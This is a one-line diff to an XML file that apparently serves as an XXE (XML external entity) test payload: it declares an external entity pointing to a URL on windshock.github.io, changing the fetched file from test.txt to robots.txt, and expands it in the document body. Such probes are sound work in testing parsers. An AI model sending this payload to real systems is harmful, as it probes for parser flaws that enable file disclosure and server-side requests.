@@ -1,4 +1,4 @@
 <?xml version="1.0"?>
 <!DOCTYPE foo [  
 <!ELEMENT foo (#ANY)>
-<!ENTITY xxe SYSTEM "https://windshock.github.io/test.txt">]><foo>&xxe;</foo>
+<!ENTITY xxe SYSTEM "https://windshock.github.io/robots.txt">]><foo>&xxe;</foo>
